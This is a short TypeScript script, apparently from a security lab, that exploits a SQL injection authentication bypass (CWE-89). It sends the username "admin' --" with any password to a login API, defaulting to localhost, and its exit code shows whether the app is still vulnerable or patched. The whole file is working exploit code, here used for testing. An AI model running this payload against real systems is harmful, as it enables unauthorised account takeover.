// Lab 1 exploit — SQL injection authentication bypass (CWE-89).
// Logs in as a target user WITHOUT knowing the password by commenting out the
// password check:  username = "<target>' --"
//
// Exit 0 = exploit worked (bypassed login). Non-zero = patched.
const BASE = process.env.BASE_URL ?? "http://localhost:3000";
const target = process.argv[2] ?? "admin";

async function main() {
  const payload = { username: `${target}' --`, password: "anything" };
  console.log(`[sqli] POST /api/login as username="${payload.username}"`);

  const r = await fetch(`${BASE}/api/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
  const data: any = await r.json().catch(() => ({}));

  if (r.ok && data.ok) {
    console.log(`\n  HIT — logged in as ${data.username} (role=${data.role}) with NO valid password.`);
    process.exit(0);
  }

  console.log(`\n  no bypass (status ${r.status}): ${JSON.stringify(data)}`);
  process.exit(1);
}

main();
